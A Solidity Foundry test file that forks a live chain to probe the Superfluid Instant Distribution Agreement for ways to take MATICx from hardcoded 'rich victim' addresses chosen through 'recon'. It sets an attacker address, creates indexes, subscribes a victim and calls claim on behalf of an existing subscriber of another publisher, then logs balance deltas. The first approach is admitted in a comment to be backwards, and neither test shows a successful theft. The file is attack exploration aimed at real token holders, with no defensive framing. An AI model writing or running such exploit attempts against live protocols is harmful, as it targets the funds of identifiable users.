// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISuperfluid {
    function callAgreement(address agreementClass, bytes calldata callData, bytes calldata userData) external returns (bytes memory);
}

interface IIDA {
    function createIndex(address token, uint32 indexId, bytes calldata ctx) external returns (bytes memory);
    function updateSubscription(address token, uint32 indexId, address subscriber, uint128 units, bytes calldata ctx) external returns (bytes memory);
    function updateIndex(address token, uint32 indexId, uint128 indexValue, bytes calldata ctx) external returns (bytes memory);
    function claim(address token, address publisher, uint32 indexId, address subscriber, bytes calldata ctx) external returns (bytes memory);
    function getIndex(address token, address publisher, uint32 indexId) external view returns (bool, uint128, uint128, uint128);
    function getSubscription(address token, address publisher, uint32 indexId, address subscriber) external view returns (bool, bool, uint128, uint256);
    function distribute(address token, uint32 indexId, uint256 amount, bytes calldata ctx) external returns (bytes memory);
}

interface IMATICx {
    function upgradeByETH() external payable;
    function downgradeToETH(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
    function realtimeBalanceOfNow(address) external view returns (int256, uint256, uint256);
}

/// @notice Test: create index as attacker, subscribe a RICH VICTIM,
/// distribute to claim victim's tokens
contract VictimIndexSkim is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    // Rich MATICx holders from our recon
    address constant VICTIM1 = 0x1c81F6A5dbD715BE1a66a38F7Ed3Bbcd4098EDd4; // ~285 MATICx

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    /// @notice Approach: We create index, add victim as subscriber,
    /// then claim FOR the victim. The victim gets tokens from US (publisher).
    /// This is BACKWARDS - we LOSE tokens. Unless forged ctx changes the flow.
    function test_approach1_wePublishVictimSubscribes() public {
        vm.startPrank(ATTACKER);

        // Get some MATICx
        IMATICx(MATICx).upgradeByETH{value: 1 ether}();

        console.log("=== Setup ===");
        console.log("Attacker MATICx:", IMATICx(MATICx).balanceOf(ATTACKER));
        console.log("Victim MATICx:", IMATICx(MATICx).balanceOf(VICTIM1));

        // Create our index
        _hostCall(abi.encodeWithSelector(IIDA.createIndex.selector, MATICx, uint32(77), new bytes(0)));

        // Subscribe VICTIM to our index (we are publisher, so we can add subscribers)
        _hostCall(abi.encodeWithSelector(IIDA.updateSubscription.selector, MATICx, uint32(77), VICTIM1, uint128(1), new bytes(0)));

        // Distribute a tiny amount
        _hostCall(abi.encodeWithSelector(IIDA.updateIndex.selector, MATICx, uint32(77), uint128(1000), new bytes(0)));

        (bool exist, bool approved, uint128 units, uint256 pending) =
            IIDA(IDA).getSubscription(MATICx, ATTACKER, 77, VICTIM1);
        console.log("Victim subscription - pending:", pending);

        // Now claim for victim (we are the caller, victim is subscriber)
        // Normal claim: we (publisher) lose, victim (subscriber) gains
        _hostCall(abi.encodeWithSelector(IIDA.claim.selector, MATICx, ATTACKER, uint32(77), VICTIM1, new bytes(0)));

        console.log("=== After claim ===");
        console.log("Attacker MATICx:", IMATICx(MATICx).balanceOf(ATTACKER));
        console.log("Victim MATICx:", IMATICx(MATICx).balanceOf(VICTIM1));

        vm.stopPrank();
    }

    /// @notice Approach 2: We subscribe to an EXISTING rich publisher's index,
    /// then claim. We gain tokens!
    /// But we need an unapproved subscription...
    /// What if the publisher added us as subscriber unknowingly?
    function test_approach2_claimExistingRichSubscription() public {
        // Check all known publisher indices for ones where we might become subscriber
        address RICH_PUB = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;

        console.log("=== Checking existing publisher 0xcaB2... ===");
        (bool exist, uint128 indexValue, uint128 totalUnitsApproved, uint128 totalUnitsPending) =
            IIDA(IDA).getIndex(MATICx, RICH_PUB, 1);
        console.log("Index exists:", exist);
        console.log("Index value:", indexValue);
        console.log("Total units approved:", totalUnitsApproved);
        console.log("Total units pending:", totalUnitsPending);

        // Can we claim for existing subscribers and somehow benefit?
        // The subscriber 0x9C6B has 92640 units with pending 89179336596046560
        address EXISTING_SUB = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;

        uint256 subBefore = IMATICx(MATICx).balanceOf(EXISTING_SUB);
        uint256 pubBefore = IMATICx(MATICx).balanceOf(RICH_PUB);
        uint256 atkBefore = IMATICx(MATICx).balanceOf(ATTACKER);

        vm.prank(ATTACKER);
        _hostCall(abi.encodeWithSelector(IIDA.claim.selector, MATICx, RICH_PUB, uint32(1), EXISTING_SUB, new bytes(0)));

        console.log("=== After claiming for existing subscriber ===");
        console.log("Subscriber delta:", int256(IMATICx(MATICx).balanceOf(EXISTING_SUB)) - int256(subBefore));
        console.log("Publisher delta:", int256(IMATICx(MATICx).balanceOf(RICH_PUB)) - int256(pubBefore));
        console.log("Attacker delta:", int256(IMATICx(MATICx).balanceOf(ATTACKER)) - int256(atkBefore));
    }

    function _hostCall(bytes memory data) internal {
        ISuperfluid(HOST).callAgreement(IDA, data, "");
    }
}
